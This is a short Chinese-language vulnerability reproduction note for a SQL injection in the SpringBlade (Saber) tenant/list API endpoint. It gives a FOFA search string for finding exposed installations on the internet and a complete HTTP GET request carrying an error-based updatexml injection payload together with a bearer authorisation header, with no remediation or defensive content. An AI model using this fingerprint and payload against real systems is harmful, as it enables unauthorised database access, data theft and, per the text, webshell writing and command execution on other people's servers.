# Saber(SpringBlade)-tenant/list SQL 注入漏洞

### <font style="color:rgba(0, 0, 0, 0.85);">漏洞描述</font>
<font style="color:rgb(119, 119, 119);">SpringBlade tenant/list SQL 注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</font>

### <font style="color:rgba(0, 0, 0, 0.85);">漏洞复现</font>
<font style="color:rgb(119, 119, 119);">1、fofa</font>

```plain
body="https://bladex.vip/"
```

</font><font style="color:rgb(119, 119, 119);">2、部分界面如下</font>

![1718087945976-34779125-044c-44bf-b0f3-25ca0a79e7d4.png](/uploads/20260518/fc3681e4-ba61-4cd3-bda4-58beddacf7c5.png)<font style="color:rgb(119, 119, 119);">

```plain
GET /api/blade-system/tenant/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
Connection: close
```
